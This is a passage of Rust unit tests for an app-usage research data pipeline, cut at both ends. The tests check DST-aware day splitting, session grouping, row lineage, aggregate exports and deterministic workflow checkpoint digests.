        assert_eq!(divided.app_row_count, 2);
    }

    /// The boundary is the first instant of the local day, which is not always
    /// midnight. Chile springs forward at 00:00, so 2026-09-06 has no 00:00
    /// local and opens at 01:00 (04:00 UTC). Resolving the boundary through
    /// `from_local_datetime` is what keeps the division on the real calendar.
    #[test]
    fn dividing_at_the_day_boundary_uses_the_first_instant_a_local_day_actually_has() {
        let santiago: Tz = "America/Santiago".parse().expect("a known timezone");
        let missing_midnight = NaiveDate::from_ymd_opt(2026, 9, 6)
            .expect("a real date")
            .and_hms_opt(0, 0, 0)
            .expect("a real wall time");
        assert!(
            matches!(
                santiago.from_local_datetime(&missing_midnight),
                chrono::LocalResult::None
            ),
            "the fixture depends on 2026-09-06 00:00 not existing in Santiago",
        );
        let day_start = local_day_start_ns(
            NaiveDate::from_ymd_opt(2026, 9, 6).expect("a real date"),
            santiago,
        )
        .expect("the day still starts somewhere");
        assert_eq!(
            ts_to_local(day_start, chrono_tz::UTC)
                .format("%Y-%m-%d %H:%M:%S")
                .to_string(),
            "2026-09-06 04:00:00",
        );

        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            // 03:30 UTC is 23:30 the previous evening in Santiago; 05:00 UTC
            // is 02:00 the next morning, after the hour that never happened.
            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-09-06 03:30:00,UTC\n",
            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-09-06 05:00:00,UTC\n",
        );
        let mut options = test_options();
        options.timezone = "America/Santiago".into();
        options.day_boundary_attribution = DayBoundaryAttribution::SplitAtLocalMidnight;
        let divided = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("the divided run succeeds across the transition");
        let rows = parse_csv_to_records_with_physical_rows(&divided.app_csv_bytes.to_vec());
        let field = |index: usize, column: &str| {
            rows[index]
                .1
                .get(column)
                .cloned()
                .unwrap_or_else(|| panic!("row {index} carries {column}"))
        };
        assert_eq!(rows.len(), 2);
        assert_eq!(field(0, "date"), "2026-09-05");
        assert_eq!(field(1, "date"), "2026-09-06");
        // 23:30 -> 01:00 local is 30 minutes of real time, not 90: the hour in
        // between never happened.
        assert_eq!(
            field(0, "duration_seconds").parse::<f64>().unwrap(),
            1_800.0
        );
        assert_eq!(
            field(1, "duration_seconds").parse::<f64>().unwrap(),
            3_600.0
        );
    }

    /// A grouping policy that nothing reads is not a measurement choice, it is
    /// a label. `session_grouping_policy` selects the published gap definition
    /// that turns adjacent episodes into one usage session, so the id has to
    /// reach the app table on the path that actually produces it.
    #[test]
    fn the_session_grouping_policy_numbers_sessions_in_the_published_app_table() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            // Three two-minute episodes. The first gap is 10 s and the second
            // is 70 s, so a 60 s cut puts the first two together and starts a
            // new session at the third.
            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:00:00,UTC\n",
            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:02:00,UTC\n",
            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:02:10,UTC\n",
            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:04:10,UTC\n",
            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:05:20,UTC\n",
            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:07:20,UTC\n",
        );

        let mut options = test_options();
        let ungrouped = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("the ungrouped run succeeds");
        let ungrouped_rows = parse_csv_to_records_with_physical_rows(&ungrouped.app_csv_bytes.to_vec());
        assert_eq!(ungrouped_rows.len(), 3);
        assert!(
            !ungrouped_rows[0].1.contains_key("usage_session_id"),
            "the default policy emits no session column at all",
        );

        options.session_grouping_policy = SessionGroupingPolicy::ZerrerSixtySeconds;
        let grouped = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("the grouped run succeeds");
        let grouped_rows = parse_csv_to_records_with_physical_rows(&grouped.app_csv_bytes.to_vec());
        assert_eq!(grouped_rows.len(), 3);
        let session_of = |index: usize| {
            grouped_rows[index]
                .1
                .get("usage_session_id")
                .cloned()
                .unwrap_or_else(|| panic!("row {index} carries usage_session_id"))
        };
        assert_eq!(
            [session_of(0), session_of(1), session_of(2)],
            ["0".to_string(), "0".to_string(), "1".to_string()],
            "a 10 s gap stays inside the session and a 70 s gap opens a new one",
        );
    }

    #[test]
    fn source_row_ranges_are_a_canonical_lossless_set_encoding() {
        let mut state = 0x8f3c_6a2d_1b79_e405_u64;
        let mut observed = BTreeSet::new();
        let mut encoded = SourceDataRows::default();
        for _ in 0..10_000 {
            state = state
                .wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1_442_695_040_888_963_407);
            let row = ((state >> 32) % 2_000 + 1) as u32;
            observed.insert(row);
            encoded.merge(&SourceDataRows::single(row));
        }

        assert_eq!(
            encoded.to_vec(),
            observed.iter().copied().collect::<Vec<_>>()
        );
        assert_eq!(encoded.len(), observed.len());
        for range in encoded.ranges() {
            assert!(range.first <= range.last);
        }
        for adjacent in encoded.ranges().windows(2) {
            assert!(adjacent[0].last.saturating_add(1) < adjacent[1].first);
        }
    }

    #[test]
    fn cached_liveness_spans_match_per_session_reference() {
        let mut state = 0x9e37_79b9_7f4a_7c15_u64;
        let mut next = || {
            state = state
                .wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1_442_695_040_888_963_407);
            state >> 32
        };

        for _ in 0..2_000 {
            let event_count = (next() % 48) as usize;
            let mut timestamps = Vec::with_capacity(event_count);
            let mut timestamp = (next() % 20) as i64 - 10;
            for _ in 0..event_count {
                timestamp += (next() % 8) as i64;
                timestamps.push(timestamp);
            }
            let mut boots = timestamps
                .iter()
                .copied()
                .filter(|_| next() % 11 == 0)
                .collect::<Vec<_>>();
            boots.sort_unstable();
            let tolerance = (next() % 12) as i64;
            let spans = build_alive_spans(&timestamps, tolerance, &boots);

            for _ in 0..12 {
                let left = (next() % 180) as i64 - 40;
                let right = left + (next() % 80) as i64;
                assert_eq!(
                    clip_alive_spans(&spans, left, right),
                    reference_alive_intervals(&timestamps, left, right, tolerance, &boots),
                    "cached liveness mismatch timestamps={timestamps:?} boots={boots:?} tolerance={tolerance} query=({left},{right})",
                );
            }
        }
    }

    #[test]
    fn timezone_discovery_is_sorted_defaults_blank_and_rejects_invalid_values() {
        let csv = concat!(
            "event_timestamp,timezone\n",
            "2026-03-07 10:00:00,America/New_York\n",
            "2026-03-07 11:00:00,\n",
            "2026-03-07 12:00:00,America/Chicago\n"
        );
        assert_eq!(
            discover_timezones_v2_native(csv.as_bytes()).unwrap(),
            vec!["America/Chicago", "America/New_York", "UTC"]
        );
        let invalid = "event_timestamp,timezone\n2026-03-07 10:00:00,Not/AZone\n";
        assert!(discover_timezones_v2_native(invalid.as_bytes())
            .unwrap_err()
            .contains("invalid timezone"));
    }

    #[test]
    fn final_unterminated_csv_record_is_processed_and_count_semantics_match_contract() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Unknown importance: 1,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P01,Target Child,Chat,Unknown importance: 2,com.example.chat,2026-03-07 10:01:00,America/Chicago"
        );
        let without_newline = run_pipeline_v2(csv.as_bytes(), &test_options(), &[], &[], &[])
            .expect("unterminated final record must parse");
        let with_newline = run_pipeline_v2(
            format!("{csv}\n").as_bytes(),
            &test_options(),
            &[],
            &[],
            &[],
        )
        .expect("newline-terminated record must parse");

        assert_eq!(without_newline.original_row_count, 2);
        assert_eq!(without_newline.processed_row_count, 2);
        assert_eq!(without_newline.app_row_count, 1);
        assert_eq!(without_newline.app_csv_bytes, with_newline.app_csv_bytes);
        assert_eq!(without_newline.row_lineage.len(), 1);
        assert_eq!(
            without_newline.row_lineage[0].source_data_row_ranges,
            vec![SourceDataRowRange { first: 1, last: 2 }]
        );
        assert_eq!(without_newline.row_lineage[0].source_data_row_count, 2);
    }

    #[test]
    fn aggregate_exports_cover_wide_long_category_and_overlapping_apps() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Target Child,Game,Activity Resumed,com.example.game,2026-03-07 10:00:30,UTC\n",
            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:02:00,UTC\n",
            "Study,P01,Target Child,Game,Activity Paused,com.example.game,2026-03-07 10:03:00,UTC\n",
        );
        let codebook = concat!(
            "app_package_name,bcm_play_store_broad_app_category\n",
            "com.example.chat,Social\n",
            "com.example.game,Games\n",
        );
        let mut options = test_options();
        options.timezone = "UTC".into();
        options.minimum_usage_duration = 0.0;
        options.model_concurrent_usage = true;
        options.use_app_codebook = true;
        options.enable_aggregates = true;

        let wide = run_pipeline_v2(csv.as_bytes(), &options, &[], &[], codebook.as_bytes())
            .expect("wide aggregate fixture");
        let wide_by_kind = wide
            .aggregate_csv_outputs
            .iter()
            .map(|output| (output.kind.as_str(), output))
            .collect::<BTreeMap<_, _>>();
        assert_eq!(wide_by_kind.len(), 5);
        assert_eq!(wide_by_kind["aggregate-daily-summary-csv"].row_count, 1);
        assert_eq!(wide_by_kind["aggregate-weekly-summary-csv"].row_count, 1);
        assert_eq!(wide_by_kind["aggregate-top-apps-csv"].row_count, 2);
        assert_eq!(
            wide_by_kind["aggregate-category-time-budget-csv"].row_count,
            2
        );
        assert_eq!(wide_by_kind["aggregate-app-co-usage-csv"].row_count, 1);
        let daily = String::from_utf8(wide_by_kind["aggregate-daily-summary-csv"].bytes.to_vec())
            .expect("daily aggregate is UTF-8 CSV");
        assert!(daily.contains("total_app_usage_minutes"));
        assert!(daily.contains("2026-03-07"));
        let categories = String::from_utf8(
            wide_by_kind["aggregate-category-time-budget-csv"]
                .bytes
                .to_vec(),
        )
        .expect("category aggregate is UTF-8 CSV");
        assert!(categories.contains("Social"));
        assert!(categories.contains("Games"));
        let co_usage = String::from_utf8(wide_by_kind["aggregate-app-co-usage-csv"].bytes.to_vec())
            .expect("co-usage aggregate is UTF-8 CSV");
        assert!(co_usage.contains("com.example.chat,com.example.game,1,1.5"));

        options.aggregate_shape = "long".into();
        let long = run_pipeline_v2(csv.as_bytes(), &options, &[], &[], codebook.as_bytes())
            .expect("long aggregate fixture");
        let long_daily = long
            .aggregate_csv_outputs
            .iter()
            .find(|output| output.kind == "aggregate-daily-summary-csv")
            .expect("long daily aggregate");
        assert_eq!(long_daily.row_count, 10);
        let long_daily_csv =
            String::from_utf8(long_daily.bytes.to_vec()).expect("long aggregate is UTF-8 CSV");
        assert!(long_daily_csv
            .starts_with("study_id,study_name,participant_id,date,timezone,metric,value\n"));
        assert!(long_daily_csv.contains("active_window_minutes,3"));
    }

    #[test]
    fn duplicate_timestamp_nudging_reads_both_stop_type_lists() {
        let run = |middle_interaction: &str, options: &PipelineV2Options| {
            let csv = format!(
                concat!(
                    "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
                    "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
                    "Study,P01,Target Child,Chat,{},com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
                    "Study,P01,Target Child,Chat,User Interaction,com.example.chat,2026-03-07 10:00:00,America/Chicago\n"
                ),
                middle_interaction
            );
            run_pipeline_v2(csv.as_bytes(), options, &[], &[], &[])
                .expect("duplicate-timestamp dependency fixture")
                .workflow_query_digests["disambiguate_duplicate_timestamps"]
                .clone()
        };

        let with_same_stop = test_options();
        let mut without_same_stop = with_same_stop.clone();
        without_same_stop.same_app_stop_types.clear();
        assert_ne!(
            run("Activity Paused", &with_same_stop),
            run("Activity Paused", &without_same_stop),
            "same_app_stop_types changes the early duplicate-timestamp order"
        );

        let with_other_stop = test_options();
        let mut without_other_stop = with_other_stop.clone();
        without_other_stop.other_stop_types.clear();
        assert_ne!(
            run("Device Shutdown", &with_other_stop),
            run("Device Shutdown", &without_other_stop),
            "other_stop_types changes the early duplicate-timestamp order"
        );
    }

    #[test]
    fn missing_stop_lineage_stays_linear_and_separates_search_from_direct_sources() {
        const EVENT_COUNT: usize = 256;
        let mut csv = String::from(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
        );
        for index in 0..EVENT_COUNT {
            csv.push_str(&format!(
                "Study,P01,Target Child,App {index},Activity Resumed,com.example.app{index},2026-03-07 10:00:00,America/Chicago\n"
            ));
        }
        let mut options = test_options();
        options.same_app_stop_types = vec!["Activity Paused".into()];
        options.other_stop_types.clear();
        options.use_activity_stopped_as_fallback = false;

        let first = run_pipeline_v2(csv.as_bytes(), &options, &[], &[], &[])
            .expect("missing-stop stress fixture must run");
        let second = run_pipeline_v2(csv.as_bytes(), &options, &[], &[], &[])
            .expect("missing-stop stress fixture must replay");
        let app_lineage = first
            .row_lineage
            .iter()
            .filter(|lineage| lineage.output_kind.as_str() == "app-csv")
            .collect::<Vec<_>>();

        assert_eq!(app_lineage.len(), EVENT_COUNT);
        assert_eq!(first.row_lineage, second.row_lineage);
        assert_eq!(
            app_lineage
                .iter()
                .map(|lineage| lineage.source_data_row_count as usize)
                .sum::<usize>(),
            EVENT_COUNT * 2 - 1,
            "searched candidates must not be misreported as direct value sources"
        );
        assert!(app_lineage
            .iter()
            .all(|lineage| lineage.source_data_row_ranges.len() <= 2));
        assert!(app_lineage
            .iter()
            .all(|lineage| lineage.searches.len() == 1));
        for (index, lineage) in app_lineage.iter().enumerate() {
            let search = &lineage.searches[0];
            assert_eq!(search.start_event_index, (index + 1) as u32);
            assert_eq!(search.end_event_index_exclusive, EVENT_COUNT as u32);
            assert_eq!(
                search.candidate_event_count,
                (EVENT_COUNT - index - 1) as u32
            );
            assert!(search
                .candidate_chain_digest
                .to_string()
                .starts_with("blake3:"));
        }
    }

    #[test]
    fn workflow_query_group_checkpoints_cover_the_contract_and_are_deterministic() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,America/Chicago\n"
        );
        let first = run_pipeline_v2(csv.as_bytes(), &test_options(), &[], &[], &[])
            .expect("first checkpoint run");
        let second = run_pipeline_v2(csv.as_bytes(), &test_options(), &[], &[], &[])
            .expect("second checkpoint run");
        let expected = BTreeSet::from([
            "app_policy",
            "attribute_person",
            "categorize_apps",
            "day_coverage",
            "dedup_and_order",
            "device_state_timeline",
            "effective_usage",
            "episode_annotations",
            "interval_cleaning",
            "normalize_timezones",
            "notification_proxy",
            "polled_emulation",
            "observation_window",
            "outputs",
            "parse_events",
            "reconstruct_episodes",
            "score_compliance",
        ]);
        assert_eq!(
            first
                .workflow_query_group_digests
                .keys()
                .map(String::as_str)
                .collect::<BTreeSet<_>>(),
            expected
        );
        assert_eq!(
            first.workflow_query_group_digests,
            second.workflow_query_group_digests
        );
        assert_eq!(
            first.workflow_query_group_checkpoints,
            second.workflow_query_group_checkpoints
        );
        let expected_queries = crate::workflow_contract::WORKFLOW_QUERIES
            .iter()
            .map(|query| query.id)
            .collect::<BTreeSet<_>>();
        assert_eq!(
            first.workflow_query_digests.len(),
            crate::workflow_contract::WORKFLOW_QUERIES.len()
        );
        assert_eq!(
            first.workflow_query_checkpoints.len(),
            crate::workflow_contract::WORKFLOW_QUERIES.len()
        );
        assert_eq!(first.workflow_query_digests, second.workflow_query_digests);
        assert_eq!(
            first.workflow_query_checkpoints,
            second.workflow_query_checkpoints
        );
        assert_eq!(
            first
                .workflow_query_checkpoints
                .keys()
                .map(String::as_str)
                .collect::<BTreeSet<_>>(),
            expected_queries
        );
        for (query_id, checkpoint) in &first.workflow_query_checkpoints {
            assert_eq!(&checkpoint.subject_id, query_id);
            assert_eq!(
                first.workflow_query_digests.get(query_id),
                Some(&checkpoint.terminal_digest)
            );
        }
        assert_eq!(
            first
                .workflow_query_group_checkpoints
                .keys()
                .map(String::as_str)
                .collect::<BTreeSet<_>>(),
            expected
        );
        for (node_id, checkpoint) in &first.workflow_query_group_checkpoints {
            assert_eq!(
                checkpoint.protocol_version,
                "chronicle-workflow-checkpoint/v1"
            );
            assert_eq!(&checkpoint.subject_id, node_id);
            assert_eq!(
                first.workflow_query_group_digests.get(node_id),
                Some(&checkpoint.terminal_digest)
            );
            for digest in [
                &checkpoint.row_membership_digest,
                &checkpoint.row_order_digest,
                &checkpoint.temporal_state_digest,
                &checkpoint.classification_digest,
                &checkpoint.payload_digest,
                &checkpoint.schema_digest,
            ] {
                assert!(
                    digest.len() == 37
                        && digest.starts_with("xxh3:")
                        && digest[5..].bytes().all(|byte| byte.is_ascii_hexdigit())
                );
            }
            assert!(
                checkpoint.terminal_digest.len() == 71
                    && checkpoint.terminal_digest.starts_with("sha256:")
                    && checkpoint.terminal_digest[7..]
                        .bytes()
                        .all(|byte| byte.is_ascii_hexdigit())
            );
        }
        assert!(first.workflow_query_group_digests.values().all(|digest| {
            digest.len() == 71
                && digest.starts_with("sha256:")
                && digest[7..].bytes().all(|byte| byte.is_ascii_hexdigit())
        }));
    }

    #[test]
    fn terminal_checkpoint_commitment_is_sensitive_to_every_typed_component() {
        let base = [
            "membership",
            "order",
            "temporal",
            "classification",
            "payload",
            "schema",
        ];
        let baseline = terminal_checkpoint_digest("node", base);
        for index in 0..base.len() {
            let mut changed = base;
            changed[index] = "mutated";
            assert_ne!(
                baseline,
                terminal_checkpoint_digest("node", changed),
                "component {index} was omitted from the terminal commitment"
            );
        }
    }

    #[test]
    fn public_workflow_checkpoint_validator_closes_every_identity_component() {
        let component = |byte: u8| format!("xxh3:{}", format!("{byte:02x}").repeat(16));
        let components = [
            component(0x11),
            component(0x22),
            component(0x33),
            component(0x44),
            component(0x55),
            component(0x66),
        ];
        let terminal = terminal_checkpoint_digest(
            "decode_source_records",
            [
                &components[0],
                &components[1],
                &components[2],
                &components[3],
                &components[4],
                &components[5],
            ],
        );
        let checkpoint = WorkflowCheckpoint {
            protocol_version: WORKFLOW_CHECKPOINT_PROTOCOL.into(),
            subject_id: "decode_source_records".into(),
            row_membership_digest: components[0].clone(),
            row_order_digest: components[1].clone(),
            temporal_state_digest: components[2].clone(),
            classification_digest: components[3].clone(),
            payload_digest: components[4].clone(),
            schema_digest: components[5].clone(),
            terminal_digest: terminal.clone(),
        };
        assert_eq!(
            validate_workflow_checkpoint_for_subject(&checkpoint, "decode_source_records").unwrap(),
            terminal
        );

        let mut protocol = checkpoint.clone();
        protocol.protocol_version = "future".into();
        assert!(
            validate_workflow_checkpoint_for_subject(&protocol, "decode_source_records").is_err()
        );
        assert!(validate_workflow_checkpoint_for_subject(&checkpoint, "other_query").is_err());

        for index in 0..6 {
            let mut changed = checkpoint.clone();
            let field = match index {
                0 => &mut changed.row_membership_digest,
                1 => &mut changed.row_order_digest,
                2 => &mut changed.temporal_state_digest,
                3 => &mut changed.classification_digest,
                4 => &mut changed.payload_digest,
                _ => &mut changed.schema_digest,
            };
            *field = component(0x77 + index as u8);
            assert!(
                validate_workflow_checkpoint_for_subject(&changed, "decode_source_records")
                    .is_err()
            );
        }

        let mut noncanonical = checkpoint;
        noncanonical.row_membership_digest.make_ascii_uppercase();
        assert!(
            validate_workflow_checkpoint_for_subject(&noncanonical, "decode_source_records")
                .is_err()
        );
    }

    #[test]
    fn batched_fixed_checkpoint_encodings_match_the_streaming_reference() {
        let first = [0x11_u8; 16];
        let second = [0x22_u8; 16];
        let third = [0x33_u8; 16];

        let mut reference = Xxh3::new();
        checkpoint_digest_field(&mut reference, &first);
        let mut batched = Xxh3::new();
        checkpoint_digest_fixed16(&mut batched, &first);
        assert_eq!(reference.digest128(), batched.digest128());

        let mut reference = Xxh3::new();
        reference.update(&7_u64.to_le_bytes());
        checkpoint_digest_field(&mut reference, &first);
        let mut batched = Xxh3::new();
        checkpoint_digest_positioned_fixed16(&mut batched, 7, &first);
        assert_eq!(reference.digest128(), batched.digest128());

        let mut reference = Xxh3::new();
        reference.update(&7_u64.to_le_bytes());
        checkpoint_digest_field(&mut reference, &first);
        checkpoint_digest_field(&mut reference, &second);
        checkpoint_digest_field(&mut reference, &third);
        let mut batched = Xxh3::new();
        checkpoint_digest_positioned_fixed16_triple(&mut batched, 7, &first, &second, &third);
        assert_eq!(reference.digest128(), batched.digest128());
    }

    #[test]
    fn buffered_checkpoint_hasher_matches_streaming_across_flush_boundaries() {
        let mut reference = Xxh3::new();
        let mut buffered = BufferedCheckpointHasher::new();
        for index in 0..1_000_usize {
            let first = xxh3_128(&(index as u64).to_le_bytes()).to_le_bytes();
            let second = xxh3_128(&((index as u64) + 1).to_le_bytes()).to_le_bytes();
            checkpoint_digest_fixed16(&mut reference, &first);
            checkpoint_digest_fixed16(&mut reference, &second);
            checkpoint_digest_fixed16(&mut buffered, &first);
            checkpoint_digest_fixed16(&mut buffered, &second);
        }
        assert_eq!(reference.digest128(), buffered.finalize128());
    }

    #[test]
    fn output_only_configuration_stops_at_the_output_checkpoint() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,America/Chicago\n"
        );
        let baseline = run_pipeline_v2(csv.as_bytes(), &test_options(), &[], &[], &[])
            .expect("baseline checkpoint run");
        let mut changed_options = test_options();
        changed_options.study_name = "Different Study Label".into();
        let changed = run_pipeline_v2(csv.as_bytes(), &changed_options, &[], &[], &[])
            .expect("changed checkpoint run");
        let changed_stages = baseline
            .workflow_query_group_digests
            .iter()
            .filter_map(|(node, digest)| {
                (changed.workflow_query_group_digests.get(node) != Some(digest))
                    .then_some(node.as_str())
            })
            .collect::<BTreeSet<_>>();
        assert_eq!(changed_stages, BTreeSet::from(["outputs"]));
        let baseline_output = &baseline.workflow_query_group_checkpoints["outputs"];
        let changed_output = &changed.workflow_query_group_checkpoints["outputs"];
        assert_eq!(
            baseline_output.row_membership_digest,
            changed_output.row_membership_digest
        );
        assert_eq!(
            baseline_output.row_order_digest,
            changed_output.row_order_digest
        );
        assert_eq!(
            baseline_output.temporal_state_digest,
            changed_output.temporal_state_digest
        );
        assert_eq!(
            baseline_output.classification_digest,
            changed_output.classification_digest
        );
        assert_eq!(baseline_output.schema_digest, changed_output.schema_digest);
        assert_ne!(
            baseline_output.payload_digest,
            changed_output.payload_digest
        );
    }

    #[test]
    fn disabled_browser_views_do_not_materialize_visualization_data() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,America/Chicago\n"
        );
        let enabled = run_pipeline_v2(csv.as_bytes(), &test_options(), &[], &[], &[])
            .expect("visualization-enabled run");
        assert!(!enabled.visualization_data_json_bytes.is_empty());
        let visualization: serde_json::Value =
            serde_json::from_slice(&enabled.visualization_data_json_bytes.to_vec())
                .expect("visualization row-array JSON");
        assert_eq!(
            visualization["protocolVersion"],
            VISUALIZATION_DATA_PROTOCOL
        );
        assert_eq!(
            visualization["columns"],
            serde_json::json!(VISUALIZATION_DATA_COLUMNS)
        );
        for family in ["appRows", "screenRows"] {
            assert!(visualization[family]
                .as_array()
                .expect("visualization row family")
                .iter()
                .all(|row| row.as_array().is_some_and(|cells| cells.len() == 11)));
        }

        let mut disabled_options = test_options();
        disabled_options.materialize_visualization_data = false;
        let disabled = run_pipeline_v2(csv.as_bytes(), &disabled_options, &[], &[], &[])
            .expect("visualization-disabled run");
        assert!(disabled.visualization_data_json_bytes.is_empty());
        assert_eq!(enabled.app_csv_bytes, disabled.app_csv_bytes);
        assert_eq!(enabled.screen_csv_bytes, disabled.screen_csv_bytes);
        assert_eq!(
            enabled.review_summary_json_bytes,
            disabled.review_summary_json_bytes
        );
        assert_eq!(enabled.row_lineage, disabled.row_lineage);

        let changed_steps = enabled
            .workflow_query_digests
            .iter()
            .filter_map(|(step, digest)| {
                (disabled.workflow_query_digests.get(step) != Some(digest)).then_some(step.as_str())
            })
            .collect::<BTreeSet<_>>();
        assert_eq!(changed_steps, BTreeSet::from(["assemble_result_manifest"]));
    }

    #[test]
    fn b03_visualization_v4_exposes_classification_and_explicit_not_applicable_cells() {
        const SECOND: i64 = 1_000_000_000;
        let app_rows = incremental::classify_episode_durations(
            episode_rows(&[(
                ACTIVITY_RESUMED,
                "com.example.micro",
                Some(0),
                Some(4 * SECOND),
            )]),
            &BTreeSet::new(),
            MicroUseClassificationPolicy::OkoshiLt5s,
            0.0,
            MinimumDurationComparator::StrictLt,
            MinimumDurationDisposition::ChronicleBlankKeepRow,
            &[],
            &b06::MaximumDurationRowStage::omitted(),
        )
        .expect("classification with the omitted B06 shape never refuses");
        let mut screen_rows = episode_rows(&[(SCREEN_USAGE, "android", Some(0), Some(SECOND))]);
        *screen_rows[0].edit_classification().interaction_type = SCREEN_USAGE.into();
        *screen_rows[0]
            .edit_classification()
            .micro_use_classification = None;

        let projected = build_visualization_data(&app_rows, &screen_rows, BTreeMap::new(), None, true);
        let value = serde_json::to_value(projected).expect("B03 visualization serializes");
        assert_eq!(value["protocolVersion"], VISUALIZATION_DATA_B03_PROTOCOL);
        assert_eq!(
            value["columns"],
            serde_json::json!(VISUALIZATION_DATA_B03_COLUMNS)
        );
        assert_eq!(value["appRows"][0][11], "micro_use");
        assert_eq!(value["screenRows"][0][11], "not_applicable");

        let mut csv_options = test_options();
        csv_options.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
        csv_options.micro_use_classification_policy_explicit = true;
        let mut csv_rows = app_rows.clone();
        csv_rows.push(screen_rows[0].clone());
        let csv = write_app_csv(&csv_rows, &csv_options, false);
        let records = parse_csv_to_records_with_physical_rows(&csv);
        assert_eq!(records[0].1["micro_use_classification"], "micro_use");
        assert_eq!(records[1].1["micro_use_classification"], "not_applicable");

        let baseline = serde_json::to_value(build_visualization_data(
            &app_rows,
            &screen_rows,
            BTreeMap::new(),
            None,
            false,
        ))
        .expect("baseline visualization serializes");
        assert_eq!(baseline["protocolVersion"], VISUALIZATION_DATA_PROTOCOL);
        assert_eq!(
            baseline["columns"],
            serde_json::json!(VISUALIZATION_DATA_COLUMNS)
        );
        assert_eq!(baseline["appRows"][0].as_array().unwrap().len(), 11);

        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,Micro,Activity Resumed,com.example.micro,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,Micro,Activity Paused,com.example.micro,2026-03-07 10:00:04,UTC\n",
        );
        let mut options = test_options();
        options.timezone = "UTC".into();
        options.correct_duplicate_event_timestamps = false;
        options.minimum_usage_duration = 0.0;
        options.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
        options.micro_use_classification_policy_explicit = true;
        let result = run_pipeline_v2_with_supports(
            raw.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("B03 full visualization projection");
        let full: serde_json::Value =
            serde_json::from_slice(&result.visualization_data_json_bytes.to_vec()).unwrap();
        assert_eq!(full["protocolVersion"], VISUALIZATION_DATA_B03_PROTOCOL);
        assert_eq!(full["appRows"][0][11], "micro_use");
    }

    #[test]
    fn timestamp_intervention_changes_temporal_shape_without_false_membership_or_classification() {
        let baseline_csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,America/Chicago\n"
        );
        let changed_csv = baseline_csv.replacen("10:00:00", "10:00:01", 1);
        let baseline = run_pipeline_v2(baseline_csv.as_bytes(), &test_options(), &[], &[], &[])
            .expect("baseline typed checkpoint");
        let changed = run_pipeline_v2(changed_csv.as_bytes(), &test_options(), &[], &[], &[])
            .expect("changed typed checkpoint");
        let baseline_parse = &baseline.workflow_query_group_checkpoints["parse_events"];
        let changed_parse = &changed.workflow_query_group_checkpoints["parse_events"];
        assert_eq!(
            baseline_parse.row_membership_digest,
            changed_parse.row_membership_digest
        );
        assert_eq!(
            baseline_parse.row_order_digest,
            changed_parse.row_order_digest
        );
        assert_eq!(
            baseline_parse.classification_digest,
            changed_parse.classification_digest
        );
        assert_eq!(baseline_parse.payload_digest, changed_parse.payload_digest);
        assert_eq!(baseline_parse.schema_digest, changed_parse.schema_digest);
        assert_ne!(
            baseline_parse.temporal_state_digest,
            changed_parse.temporal_state_digest
        );
        assert_ne!(
            baseline_parse.terminal_digest,
            changed_parse.terminal_digest
        );
    }

    #[test]
    fn timestamp_reordering_is_separated_from_membership_and_classification() {
        let baseline_csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
